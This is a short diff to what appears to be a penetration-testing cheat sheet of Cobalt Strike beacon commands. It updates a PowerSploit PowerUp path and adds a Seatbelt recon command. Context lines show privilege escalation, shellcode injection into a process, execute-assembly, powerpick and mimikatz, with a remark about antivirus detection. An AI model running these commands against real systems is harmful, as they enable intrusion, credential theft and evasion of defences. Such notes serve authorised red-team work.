@@ -21,7 +21,7 @@ elevate ...  			# usually does not work
 #invoke powershell
 powershell whoami
 #powershell import
-powershell-import /tools/windows/PowerSploit/Privesc/PowerUp.ps1
+powershell-import /opt/outils/windows/PowerSploit/Privesc/PowerUp.ps1
 powershell Invoke-AllChecks
 powershell Invoke-AllChecks -HtmlReport
 #invoke powerpick (powershell without powershell)
@@ -43,6 +43,8 @@ shinject <pid> /tools/.../shellcode.bin
 
 #Execute a local .net assembly
 execute-assembly /tools/../letsbefriends.exe
+#Recon with Seatbelt
+execute-assembly /opt/wintools/Seatbelt/Seatbelt.exe -group=system -q -outputfile="C:\Users\myuser\Documents\outSystem.txt"
 
 #mimikatz
 mimikatz standard::coffee # see if it gets catched by AV
